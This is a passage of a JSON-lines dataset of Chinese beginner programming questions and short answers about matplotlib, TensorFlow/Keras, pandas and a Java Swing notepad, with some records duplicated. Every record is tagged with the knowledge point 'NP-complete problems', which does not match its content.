from matplotlib.colors ", "import", " ListedColormap\n    ", "custom_cmap", " = ListedColormap(['", "#EF9A9A','#FFF59D','#90CAF9'])", "\n    plt.contourf(x0,x1,zz,", "cmap", " = custom_cmap)\n\nplot_decision_boundary(dt_clf,", "axis=", " [", "0.5", ",", "7.5", ",", "0", ",", "3", "])\nplt.scatter(x[", "y==0,0],x[y==0,1])", "\nplt.scatter(x[", "y==1,0],x[y==1,1])", "\nplt.scatter(x[", "y==2,0],x[y==2,1])", "\nplt.show() ", "# 这个结果有点不对 ，但我又不知道哪里搞错了", "\n", "\n", "第一次运行出现了下图所示的分类结果：", "\n", "第二次及以后运行时出现了下图的分类结果：", "\n", "我想知道明明是相同的数据，相同的代码，只是运行先后顺序不同，为什么会出现上下两个图之间的完全不同的分类结果，并且出现哪种分类结果还有一定的随机性？我的代码里也没有随机数。虽然非参数学习对于数据依赖非常严重，但是我的数据也没有发生更改啊，很奇怪。"]], "Tag": "算法设计"}
{"Answer": "可以试着调整神经层的结构和模型的超参数，试着多次调整达到对每个参数的理解，建议可以先简要看看莫烦的视频教程，对各个参数有个大致了解，这是链接https://morvanzhou.github.io/", "Konwledge_Point": "NP完全问题", "Question": ["Tensorflow建一个神经网络，输出数据只有一个谱型，且杂乱", ["建了一个神经网络，输入节点3个，输出250个，两个隐藏层，节点数分别为200个。", "\n训练数据集为100000个。运行完后用测试集验证，发现预测的谱线杂乱无章，跟测试的谱线集完全无关，从图中看感觉是在一个谱型附近震荡。", "\n 初学者不明白是什么原因，不知有没有大神可以稍加指教。", "\n\n", "import tensorflow as tf\nimport numpy as np\n# 添加层\ndef add_layer(inputs, in_size, out_size,n_layer,activation_function=None):\n          Weights = tf.Variable(tf.random_normal([in_size, out_size]))\n          Wx_plus_b = tf.matmul(inputs, Weights)\n          if activation_function is None:\n           outputs = Wx_plus_b\n          else:\n               outputs = activation_function(Wx_plus_b)\n          return outputs\n# 1.训练的数据\np_1= np.loadtxt('D:p_train.txt')\np=np.reshape(p_1,(3,100000))\ns_1= np.loadtxt('D:s_train.txt')\ns=np.reshape(s_1,(250,100000))\npmin=p.min()\npmax=p.max()\np_train=(p-pmin)/(pmax-pmin)\nsmin=s.min()\nsmax=s.max()\ns_train=(s-smin)/(smax-smin)\np_train=np.transpose(p_train)\ns_train=np.transpose(s_train)\np_train=p_train.tolist()\ns_train=s_train.tolist()\n# 2.测试的数据\np_2=np.loadtxt('D:p_test.txt')\np2=np.reshape(p_2,(3,5501))\ns_2=np.loadtxt('D:s_test.txt')\ns2=np.reshape(s_2,(250,5501))\npmin2=p2.min()\npmax2=p2.max()\np_test=(p2-pmin2)/(pmax2-pmin2)\nsmin2=s2.min()\nsmax2=s2.max()\ns_test=(s2-smin2)/(smax2-smin2)\np_test=np.transpose(p_test)\ns_test=np.transpose(s_test)\np_test=p_test.tolist()\ns_test=s_test.tolist()\n\n# 3.定义占位符 \npx = tf.placeholder(tf.float32, [None, 3])\nsx = tf.placeholder(tf.float32, [None,250])\nsy=tf.placeholder(tf.float32,[None,250])\n# 4.定义神经层：隐藏层和预测层\nl1 = add_layer(px, 3, 200, n_layer=1,activation_function=tf.nn.sigmoid)\nl2=add_layer(l1,200,200,n_layer=2,activation_function=tf.nn.sigmoid)\nprediction = add_layer(l2, 200, 250, n_layer=3,activation_function=None)\n\n# 5.定义 loss 表达式 mse\nloss = tf.reduce_mean(tf.square(sx - prediction))\n#loss2\n\n# 6.选择 optimizer 使 loss 达到最小                   \ntrain_step = tf.train.AdamOptimizer(0.01,epsilon=1e-8).minimize(loss)\n\n#7.初始化变量\ninit=tf.initialize_all_variables()\n#8.定义会话\nsess = tf.Session()\n#9.运行\nsess.run(init) \n#10.查看loss变化\nfor step in range(1000):\n   sess.run(train_step, feed_dict={px:p_train, sx:s_train})\n   if step % 50 == 0:    \n        print(sess.run(loss,feed_dict={sx:s_train,px:p_train}))\n\nprediction_test=sess.run(prediction,feed_dict={px:p_test})\n\n"]], "Tag": "算法设计"}
{"Answer": "可以试着调整神经层的结构和模型的超参数，试着多次调整达到对每个参数的理解，建议可以先简要看看莫烦的视频教程，对各个参数有个大致了解，这是链接https://morvanzhou.github.io/", "Konwledge_Point": "NP完全问题", "Question": ["Tensorflow建一个神经网络，输出数据只有一个谱型，且杂乱", ["建了一个神经网络，输入节点3个，输出250个，两个隐藏层，节点数分别为200个。", "\n训练数据集为100000个。运行完后用测试集验证，发现预测的谱线杂乱无章，跟测试的谱线集完全无关，从图中看感觉是在一个谱型附近震荡。", "\n 初学者不明白是什么原因，不知有没有大神可以稍加指教。", "\n\n", "import tensorflow as tf\nimport numpy as np\n# 添加层\ndef add_layer(inputs, in_size, out_size,n_layer,activation_function=None):\n          Weights = tf.Variable(tf.random_normal([in_size, out_size]))\n          Wx_plus_b = tf.matmul(inputs, Weights)\n          if activation_function is None:\n           outputs = Wx_plus_b\n          else:\n               outputs = activation_function(Wx_plus_b)\n          return outputs\n# 1.训练的数据\np_1= np.loadtxt('D:p_train.txt')\np=np.reshape(p_1,(3,100000))\ns_1= np.loadtxt('D:s_train.txt')\ns=np.reshape(s_1,(250,100000))\npmin=p.min()\npmax=p.max()\np_train=(p-pmin)/(pmax-pmin)\nsmin=s.min()\nsmax=s.max()\ns_train=(s-smin)/(smax-smin)\np_train=np.transpose(p_train)\ns_train=np.transpose(s_train)\np_train=p_train.tolist()\ns_train=s_train.tolist()\n# 2.测试的数据\np_2=np.loadtxt('D:p_test.txt')\np2=np.reshape(p_2,(3,5501))\ns_2=np.loadtxt('D:s_test.txt')\ns2=np.reshape(s_2,(250,5501))\npmin2=p2.min()\npmax2=p2.max()\np_test=(p2-pmin2)/(pmax2-pmin2)\nsmin2=s2.min()\nsmax2=s2.max()\ns_test=(s2-smin2)/(smax2-smin2)\np_test=np.transpose(p_test)\ns_test=np.transpose(s_test)\np_test=p_test.tolist()\ns_test=s_test.tolist()\n\n# 3.定义占位符 \npx = tf.placeholder(tf.float32, [None, 3])\nsx = tf.placeholder(tf.float32, [None,250])\nsy=tf.placeholder(tf.float32,[None,250])\n# 4.定义神经层：隐藏层和预测层\nl1 = add_layer(px, 3, 200, n_layer=1,activation_function=tf.nn.sigmoid)\nl2=add_layer(l1,200,200,n_layer=2,activation_function=tf.nn.sigmoid)\nprediction = add_layer(l2, 200, 250, n_layer=3,activation_function=None)\n\n# 5.定义 loss 表达式 mse\nloss = tf.reduce_mean(tf.square(sx - prediction))\n#loss2\n\n# 6.选择 optimizer 使 loss 达到最小                   \ntrain_step = tf.train.AdamOptimizer(0.01,epsilon=1e-8).minimize(loss)\n\n#7.初始化变量\ninit=tf.initialize_all_variables()\n#8.定义会话\nsess = tf.Session()\n#9.运行\nsess.run(init) \n#10.查看loss变化\nfor step in range(1000):\n   sess.run(train_step, feed_dict={px:p_train, sx:s_train})\n   if step % 50 == 0:    \n        print(sess.run(loss,feed_dict={sx:s_train,px:p_train}))\n\nprediction_test=sess.run(prediction,feed_dict={px:p_test})\n\n"]], "Tag": "算法设计"}
{"Answer": "&lt;p&gt;loss不是binary_crossentropy&amp;#xff1f;&lt;/p&gt;", "Konwledge_Point": "NP完全问题", "Question": ["tensorflow中model.fit（）函数输入参数报错，如何解决？", ["问题遇到的现象和发生背景", "\n", "问题相关代码，请勿粘贴截图", "\n", "import pandas as pd", "import numpy as np", "import matplotlib.pyplot as plt", "filepath_dict = 'venv\\Data.csv'", "df = pd.read_csv(filepath_dict  )", "sentences = df['headlines'].values", "y = df['target'].values", "Y = []", "for target in y:", "    if target == 'Sarcastic':", "        Y.append(1)", "    else:", "        Y.append(0)", "from sklearn.model_selection import train_test_split", "sentences_train,sentences_test,Y_train,Y_test = train_test_split(sentences,Y,test_size=0.5,random_state=500)", "from keras.preprocessing.text import Tokenizer", "tokenizer = Tokenizer(num_words=10000)", "tokenizer.fit_on_texts(sentences)", "maxlen = 300", "vocab_size = len(tokenizer.word_index)+1", "#embedding模型", "\n", "X_train = tokenizer.texts_to_sequences(sentences_train)", "X_test = tokenizer.texts_to_sequences(sentences_test)", "from keras.preprocessing.sequence import pad_sequences", "X_train = pad_sequences(X_train,padding='post',maxlen=maxlen)", "X_test = pad_sequences(X_test,padding='post',maxlen=maxlen)", "Y_test = np.array(Y_test)", "Y_train = np.array(Y_train)", "#结束", "\n", "embedding_dim = 300", "from keras.models import  Sequential", "from  keras import  layers", "from keras.layers import Dense,Activation,Dropout,LSTM", "from keras.optimizer_v2 import adam", "model = Sequential()", "model.add(layers.Embedding(vocab_size,", "                           embedding_dim,", "                           input_length=maxlen,", "                           trainable=True))", "model.add(LSTM(128,return_sequences=True))", "model.add(LSTM(64,return_sequences=False))", "model.add(layers.Dense(15,activation='relu'))", "model.add(layers.Dense(1,activation='sigmoid'))", "model.compile(optimizer='adam',", "              loss = 'bomart_crossentropy',", "              metrics=  ['accuracy'])", "model.summary()", "history = model.fit(X_train,", "                    Y_train,", "                    epochs=20,", "                    verbose=False,", "                    validation_data=(X_test,Y_test),", "                    batch_size=10)", "\n", "运行结果及报错内容", "\n", "Traceback (most recent call last):", "  File \"C:\\Users\\yly20\\PycharmProjects\\pythonProject1\\main.py\", line 63, in ", "    history = model.fit(X_train,", "  File \"C:\\Users\\yly20\\PycharmProjects\\pythonProject1\\venv\\lib\\site-packages\\keras\\utils\\traceback_utils.py\", line 67, in error_handler", "    raise e.with_traceback(filtered_tb) from None", "  File \"C:\\Users\\yly20\\PycharmProjects\\pythonProject1\\venv\\lib\\site-packages\\tensorflow\\python\\framework\\func_graph.py\", line 1147, in autograph_handler", "    raise e.ag_error_metadata.to_exception(e)", "ValueError: in user code:", "\n", "File", " ", "\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1", "\\v", "env\\lib\\site-packages\\keras", "\\e", "ngine", "\\t", "raining.py\"", ", ", "line", " ", "1021", ", ", "in", " ", "train_function", "  ", "*", "\n    ", "return", " ", "step_function", "(", "self", ", ", "iterator", ")\n", "File", " ", "\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1", "\\v", "env\\lib\\site-packages\\keras", "\\e", "ngine", "\\t", "raining.py\"", ", ", "line", " ", "1010", ", ", "in", " ", "step_function", "  ", "*", "*", "\n    ", "outputs", " ", "=", " ", "model", ".", "distribute_strategy", ".", "run", "(", "run_step", ", ", "args", "=", "(", "data", ",))\n", "File", " ", "\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1", "\\v", "env\\lib\\site-packages\\keras", "\\e", "ngine", "\\t", "raining.py\"", ", ", "line", " ", "1000", ", ", "in", " ", "run_step", "  ", "*", "*", "\n    ", "outputs", " ", "=", " ", "model", ".", "train_step", "(", "data", ")\n", "File", " ", "\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1", "\\v", "env\\lib\\site-packages\\keras", "\\e", "ngine", "\\t", "raining.py\"", ", ", "line", " ", "860", ", ", "in", " ", "train_step", "\n    ", "loss", " ", "=", " ", "self", ".", "compute_loss", "(", "x", ", ", "y", ", ", "y_pred", ", ", "sample_weight", ")\n", "File", " ", "\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1", "\\v", "env\\lib\\site-packages\\keras", "\\e", "ngine", "\\t", "raining.py\"", ", ", "line", " ", "918", ", ", "in", " ", "compute_loss", "\n    ", "return", " ", "self", ".", "compiled_loss", "(\n", "File", " ", "\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1", "\\v", "env\\lib\\site-packages\\keras", "\\e", "ngine\\compile_utils.py\"", ", ", "line", " ", "184", ", ", "in", " ", "__call__", "\n    ", "self", ".", "build", "(", "y_pred", ")\n", "File", " ", "\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1", "\\v", "env\\lib\\site-packages\\keras", "\\e", "ngine\\compile_utils.py\"", ", ", "line", " ", "133", ", ", "in", " ", "build", "\n    ", "self", ".", "_losses", " ", "=", " ", "tf", ".", "nest", ".", "map_structure", "(", "self", ".", "_get_loss_object", ", ", "self", ".", "_losses", ")\n", "File", " ", "\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1", "\\v", "env\\lib\\site-packages\\keras", "\\e", "ngine\\compile_utils.py\"", ", ", "line", " ", "272", ", ", "in", " ", "_get_loss_object", "\n    ", "loss", " ", "=", " ", "losses_mod", ".", "get", "(", "loss", ")\n", "File", " ", "\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1", "\\v", "env\\lib\\site-packages\\keras\\losses.py\"", ", ", "line", " ", "2369", ", ", "in", " ", "get", "\n    ", "return", " ", "deserialize", "(", "identifier", ")\n", "File", " ", "\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1", "\\v", "env\\lib\\site-packages\\keras\\losses.py\"", ", ", "line", " ", "2324", ", ", "in", " ", "deserialize", "\n    ", "return", " ", "deserialize_keras_object", "(\n", "File", " ", "\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1", "\\v", "env\\lib\\site-packages\\keras\\utils\\generic_utils.py\"", ", ", "line", " ", "709", ", ", "in", " ", "deserialize_keras_object", "\n    ", "raise", " ", "ValueError", "(\n\n", "ValueError", ": ", "Unknown", " ", "loss", " ", "function", ": ", "bomart_crossentropy", ". ", "Please", " ", "ensure", " ", "this", " ", "object", " ", "is", " ", "passed", " ", "to", " ", "the", " `", "custom_objects", "` ", "argument", ". ", "See", " ", "https", ":", "//www.tensorflow.org/guide/keras/save_and_serialize#registering_the_custom_object for details.", "\n", "\n", "我的解答思路和尝试过的方法", "\n", "似乎我完全没有找到方法解决，求指教", "\n", "我想要达到的结果"]], "Tag": "算法设计"}
{"Answer": "&lt;p&gt;loss不是binary_crossentropy&amp;#xff1f;&lt;/p&gt;", "Konwledge_Point": "NP完全问题", "Question": ["tensorflow中model.fit（）函数输入参数报错，如何解决？", ["问题遇到的现象和发生背景", "\n", "问题相关代码，请勿粘贴截图", "\n", "import pandas as pd", "import numpy as np", "import matplotlib.pyplot as plt", "filepath_dict = 'venv\\Data.csv'", "df = pd.read_csv(filepath_dict  )", "sentences = df['headlines'].values", "y = df['target'].values", "Y = []", "for target in y:", "    if target == 'Sarcastic':", "        Y.append(1)", "    else:", "        Y.append(0)", "from sklearn.model_selection import train_test_split", "sentences_train,sentences_test,Y_train,Y_test = train_test_split(sentences,Y,test_size=0.5,random_state=500)", "from keras.preprocessing.text import Tokenizer", "tokenizer = Tokenizer(num_words=10000)", "tokenizer.fit_on_texts(sentences)", "maxlen = 300", "vocab_size = len(tokenizer.word_index)+1", "#embedding模型", "\n", "X_train = tokenizer.texts_to_sequences(sentences_train)", "X_test = tokenizer.texts_to_sequences(sentences_test)", "from keras.preprocessing.sequence import pad_sequences", "X_train = pad_sequences(X_train,padding='post',maxlen=maxlen)", "X_test = pad_sequences(X_test,padding='post',maxlen=maxlen)", "Y_test = np.array(Y_test)", "Y_train = np.array(Y_train)", "#结束", "\n", "embedding_dim = 300", "from keras.models import  Sequential", "from  keras import  layers", "from keras.layers import Dense,Activation,Dropout,LSTM", "from keras.optimizer_v2 import adam", "model = Sequential()", "model.add(layers.Embedding(vocab_size,", "                           embedding_dim,", "                           input_length=maxlen,", "                           trainable=True))", "model.add(LSTM(128,return_sequences=True))", "model.add(LSTM(64,return_sequences=False))", "model.add(layers.Dense(15,activation='relu'))", "model.add(layers.Dense(1,activation='sigmoid'))", "model.compile(optimizer='adam',", "              loss = 'bomart_crossentropy',", "              metrics=  ['accuracy'])", "model.summary()", "history = model.fit(X_train,", "                    Y_train,", "                    epochs=20,", "                    verbose=False,", "                    validation_data=(X_test,Y_test),", "                    batch_size=10)", "\n", "运行结果及报错内容", "\n", "Traceback (most recent call last):", "  File \"C:\\Users\\yly20\\PycharmProjects\\pythonProject1\\main.py\", line 63, in ", "    history = model.fit(X_train,", "  File \"C:\\Users\\yly20\\PycharmProjects\\pythonProject1\\venv\\lib\\site-packages\\keras\\utils\\traceback_utils.py\", line 67, in error_handler", "    raise e.with_traceback(filtered_tb) from None", "  File \"C:\\Users\\yly20\\PycharmProjects\\pythonProject1\\venv\\lib\\site-packages\\tensorflow\\python\\framework\\func_graph.py\", line 1147, in autograph_handler", "    raise e.ag_error_metadata.to_exception(e)", "ValueError: in user code:", "\n", "File", " ", "\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1", "\\v", "env\\lib\\site-packages\\keras", "\\e", "ngine", "\\t", "raining.py\"", ", ", "line", " ", "1021", ", ", "in", " ", "train_function", "  ", "*", "\n    ", "return", " ", "step_function", "(", "self", ", ", "iterator", ")\n", "File", " ", "\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1", "\\v", "env\\lib\\site-packages\\keras", "\\e", "ngine", "\\t", "raining.py\"", ", ", "line", " ", "1010", ", ", "in", " ", "step_function", "  ", "*", "*", "\n    ", "outputs", " ", "=", " ", "model", ".", "distribute_strategy", ".", "run", "(", "run_step", ", ", "args", "=", "(", "data", ",))\n", "File", " ", "\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1", "\\v", "env\\lib\\site-packages\\keras", "\\e", "ngine", "\\t", "raining.py\"", ", ", "line", " ", "1000", ", ", "in", " ", "run_step", "  ", "*", "*", "\n    ", "outputs", " ", "=", " ", "model", ".", "train_step", "(", "data", ")\n", "File", " ", "\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1", "\\v", "env\\lib\\site-packages\\keras", "\\e", "ngine", "\\t", "raining.py\"", ", ", "line", " ", "860", ", ", "in", " ", "train_step", "\n    ", "loss", " ", "=", " ", "self", ".", "compute_loss", "(", "x", ", ", "y", ", ", "y_pred", ", ", "sample_weight", ")\n", "File", " ", "\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1", "\\v", "env\\lib\\site-packages\\keras", "\\e", "ngine", "\\t", "raining.py\"", ", ", "line", " ", "918", ", ", "in", " ", "compute_loss", "\n    ", "return", " ", "self", ".", "compiled_loss", "(\n", "File", " ", "\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1", "\\v", "env\\lib\\site-packages\\keras", "\\e", "ngine\\compile_utils.py\"", ", ", "line", " ", "184", ", ", "in", " ", "__call__", "\n    ", "self", ".", "build", "(", "y_pred", ")\n", "File", " ", "\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1", "\\v", "env\\lib\\site-packages\\keras", "\\e", "ngine\\compile_utils.py\"", ", ", "line", " ", "133", ", ", "in", " ", "build", "\n    ", "self", ".", "_losses", " ", "=", " ", "tf", ".", "nest", ".", "map_structure", "(", "self", ".", "_get_loss_object", ", ", "self", ".", "_losses", ")\n", "File", " ", "\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1", "\\v", "env\\lib\\site-packages\\keras", "\\e", "ngine\\compile_utils.py\"", ", ", "line", " ", "272", ", ", "in", " ", "_get_loss_object", "\n    ", "loss", " ", "=", " ", "losses_mod", ".", "get", "(", "loss", ")\n", "File", " ", "\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1", "\\v", "env\\lib\\site-packages\\keras\\losses.py\"", ", ", "line", " ", "2369", ", ", "in", " ", "get", "\n    ", "return", " ", "deserialize", "(", "identifier", ")\n", "File", " ", "\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1", "\\v", "env\\lib\\site-packages\\keras\\losses.py\"", ", ", "line", " ", "2324", ", ", "in", " ", "deserialize", "\n    ", "return", " ", "deserialize_keras_object", "(\n", "File", " ", "\"C:\\Users\\yly20\\PycharmProjects\\pythonProject1", "\\v", "env\\lib\\site-packages\\keras\\utils\\generic_utils.py\"", ", ", "line", " ", "709", ", ", "in", " ", "deserialize_keras_object", "\n    ", "raise", " ", "ValueError", "(\n\n", "ValueError", ": ", "Unknown", " ", "loss", " ", "function", ": ", "bomart_crossentropy", ". ", "Please", " ", "ensure", " ", "this", " ", "object", " ", "is", " ", "passed", " ", "to", " ", "the", " `", "custom_objects", "` ", "argument", ". ", "See", " ", "https", ":", "//www.tensorflow.org/guide/keras/save_and_serialize#registering_the_custom_object for details.", "\n", "\n", "我的解答思路和尝试过的方法", "\n", "似乎我完全没有找到方法解决，求指教", "\n", "我想要达到的结果"]], "Tag": "算法设计"}
{"Answer": "&lt;p&gt;可能要把&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-python\"&gt;&lt;span class=\"hljs-attribute\"&gt;df_test_1&lt;/span&gt;.loc[&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;:len(fn_cur) - &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;, columns[&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;]] &amp;#61; fn_cur\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;改成&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-python\"&gt;&lt;span class=\"hljs-attribute\"&gt;df_test_1&lt;/span&gt;.loc[&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;:len(fn_cur) - &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;, columns_[&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;]] &amp;#61; fn_cur\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "NP完全问题", "Question": ["pandas莫名多出一列", ["pandas今天运行的时候发现了一个很神奇的bug, 目前不懂原理, 希望大家看看", "\n", "columns_", " =", " [ \"输入频阶\", \"输入频率\", \"输出频率\", \"输出频率(全)\"]", "\n", "df_test_1", " = pd.DataFrame(np.full((", "21", ", ", "4", "), ''), columns=columns_)\n", "# 插入数据", "\n", "df_test_1", ".loc[", "0", ":len(fn_cur) - ", "1", ", columns[", "0", "]] = fn_cur\n", "df_test_1", ".loc[", "0", ":len(freq_list) - ", "1", ", columns[", "1", "]] = freq_list\n", "df_test_1", ".loc[", "0", ":len(freq_list_n[", "0", "]) - ", "1", ", columns[", "2", "]] = freq_list_n[", "0", "]\n", "df_test_1", ".loc[", "0", ":len(freq_list_n[", "1", "]) - ", "1", ", columns[", "3", "]] = freq_list_n[", "1", "]\n", "print", "(df_test_1)\n", "\n", "我当前的新建表格拿来承载新数据, 但是出现了一个意料之外的错误", "\n", "\n", "跑完程序发现, 竟然多出来列  在完全没有添加的情况下, 有点不可思议, 然后我用调试模式一步步试了一试, 多出来的列索引是插入列数据来的", "\n", "下面我插入一列数据", "\n", "\n", "再看看df, 很不可思议已经多出来一列, 这里fn_cur就是一个简单的列表而已, 并不带这个列值~~", "\n", "所以, 这是怎么产生的呢"]], "Tag": "算法设计"}
{"Answer": "&lt;p&gt;可能要把&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-python\"&gt;&lt;span class=\"hljs-attribute\"&gt;df_test_1&lt;/span&gt;.loc[&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;:len(fn_cur) - &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;, columns[&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;]] &amp;#61; fn_cur\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;改成&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-python\"&gt;&lt;span class=\"hljs-attribute\"&gt;df_test_1&lt;/span&gt;.loc[&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;:len(fn_cur) - &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;, columns_[&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;]] &amp;#61; fn_cur\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "NP完全问题", "Question": ["pandas莫名多出一列", ["pandas今天运行的时候发现了一个很神奇的bug, 目前不懂原理, 希望大家看看", "\n", "columns_", " =", " [ \"输入频阶\", \"输入频率\", \"输出频率\", \"输出频率(全)\"]", "\n", "df_test_1", " = pd.DataFrame(np.full((", "21", ", ", "4", "), ''), columns=columns_)\n", "# 插入数据", "\n", "df_test_1", ".loc[", "0", ":len(fn_cur) - ", "1", ", columns[", "0", "]] = fn_cur\n", "df_test_1", ".loc[", "0", ":len(freq_list) - ", "1", ", columns[", "1", "]] = freq_list\n", "df_test_1", ".loc[", "0", ":len(freq_list_n[", "0", "]) - ", "1", ", columns[", "2", "]] = freq_list_n[", "0", "]\n", "df_test_1", ".loc[", "0", ":len(freq_list_n[", "1", "]) - ", "1", ", columns[", "3", "]] = freq_list_n[", "1", "]\n", "print", "(df_test_1)\n", "\n", "我当前的新建表格拿来承载新数据, 但是出现了一个意料之外的错误", "\n", "\n", "跑完程序发现, 竟然多出来列  在完全没有添加的情况下, 有点不可思议, 然后我用调试模式一步步试了一试, 多出来的列索引是插入列数据来的", "\n", "下面我插入一列数据", "\n", "\n", "再看看df, 很不可思议已经多出来一列, 这里fn_cur就是一个简单的列表而已, 并不带这个列值~~", "\n", "所以, 这是怎么产生的呢"]], "Tag": "算法设计"}
{"Answer": "测试了你的代码，很好理解，当你点击取消是，你的选择文件返回的对象是空，所以跑异常了。就是下面这行代码在取消时为true.\r\n\r\n```\r\n System.out.println(jfc.getSelectedFile()==null);\r\n```\r\n修正代码，点击取消时，不作处理。\r\n\r\n```\r\n // 得到用户希望把文件保存到何处，文件全路径\r\n\t\t\tFile selectedFile = jfc.getSelectedFile();\r\n\t\t\tif(selectedFile==null){\r\n\t\t\t\tSystem.out.println(\"用户为选择保存文件.\");\r\n\t\t\t\treturn ;\r\n\t\t\t}\r\n\t\t\tString file = selectedFile.getAbsolutePath();\r\n```", "Konwledge_Point": "NP完全问题", "Question": ["java新手，写记事本出现异常，求助各路大神", ["当我点击取消的时候（无论是打开或者保存界面的取消），就会跳出异常（本人最近在看韩顺平老师的java入门，和老师的代码对了好几遍发现完全相同，但是老师点取消的时候就没有异常，不得其解），异常如下", "我怀疑是这出了问题但是不知道怎么解决。。。", "\n/**", "\n\n", "\n", "我的记事本（界面＋功能）\n", "/\npackage com.test7;\nimport java.io.", ";\nimport java.awt.*;\nimport java.awt.event.*;", "\n", "//import java.awt.image.ImageObserver;", "\n//import java.awt.image.ImageProducer;", "\n\n", "import javax.swing.*;", "\n\n", "public class NotePad extends JFrame implements ActionListener{", "\n\n", "//定义需要的组件\nJTextArea jta=null;\n//菜单栏\nJMenuBar jmb=null;\n//定义JMenu\nJMenu jm1=null;\n//定义JMenuItem\nJMenuItem jmi1=null;\nJMenuItem jmi2=null;\n\npublic static void main(String[] args) {\n    // TODO Auto-generated method stub\n\n    NotePad np=new NotePad();\n\n}\n\n//构造函数\npublic NotePad()\n{\n    //创建jta\n    jta=new JTextArea();\n    jmb=new JMenuBar();\n    jm1=new JMenu(\"打开（o）\");\n    //设置助记符\n    jm1.setMnemonic('F');\n    jmi1=new JMenuItem(\"打开\", new ImageIcon(\"a.gif\")); \n    jmi2=new JMenuItem(\"保存\");\n\n    //注册监听\n    jmi1.addActionListener(this);\n    jmi1.setActionCommand(\"open\");\n\n    jmi2.addActionListener(this);\n    jmi2.setActionCommand(\"save\");\n    //加入\n    this.setJMenuBar(jmb);\n    //把jm1放入到jmb\n    jmb.add(jm1);\n    //把item放入到menu\n    jm1.add(jmi1);\n    jm1.add(jmi2);\n    //放入到JFrame\n    this.add(jta);\n    this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n    this.setSize(400, 300);\n    this.setVisible(true);\n\n}\n\npublic void actionPerformed(ActionEvent e) {\n    // TODO Auto-generated method stub\n\n    //判断是那个菜单被选中\n    if(e.getActionCommand().equals(\"open\"))\n    {\n", "\n\n", "//          System.out.println(\"open\");", "\n\n", "        //隆重推荐JFileChooser\n        //创建文件选择组件\n        JFileChooser jfc1=new JFileChooser();\n        //设置名字\n        jfc1.setDialogTitle(\"请选择文件....\");\n        //默认方式\n        jfc1.showOpenDialog(null);\n        //显示\n        jfc1.setVisible(true);\n\n        //得到用户选择的文件全路径\n        String filename=jfc1.getSelectedFile().getAbsolutePath();\n\n        FileReader fr=null;\n        BufferedReader br=null;\n        try {\n            fr=new FileReader(filename);\n            br=new BufferedReader(fr);\n\n            //从文件中读取信息并jta\n\n            String s=\" \";\n            String allCon=\" \";\n            while((s=br.readLine())!=null)\n            {\n\n                allCon+=s+\"\\r\\n\";\n\n            }\n\n            //放置到jta即可\n            jta.setText(allCon);\n        } catch (Exception e2) {\n            // TODO: handle exception\n            e2.printStackTrace();\n        }finally{\n            try {\n                br.close();\n                fr.close();\n            } catch (IOException e1) {\n                // TODO Auto-generated catch block\n                e1.printStackTrace();\n            }\n\n        }\n    }\n    else if(e.getActionCommand().equals(\"save\"))\n    {\n        JFileChooser jfc=new JFileChooser();\n        jfc.setDialogTitle(\"另存为\");\n        //按默认的方式显示\n        jfc.showSaveDialog(null);\n        jfc.setVisible(true);\n\n        //得到用户希望把文件保存到何处，文件全路径\n        String file=jfc.getSelectedFile().getAbsolutePath();\n\n        //准备写入到指定文件即可\n        FileWriter fw=null;\n        BufferedWriter bw=null;\n\n        try {\n            fw=new FileWriter(file);\n            bw=new BufferedWriter(fw);\n\n            bw.write(this.jta.getText());\n        } catch (Exception e2) {\n            // TODO: handle exception\n            e2.printStackTrace();\n        }finally{\n            try {\n\n                bw.close();\n                fw.close();\n            } catch (Exception e3) {\n                // TODO: handle exception\n\n            }\n        }\n    }\n}\n", "\n\n", "}"]], "Tag": "算法设计"}
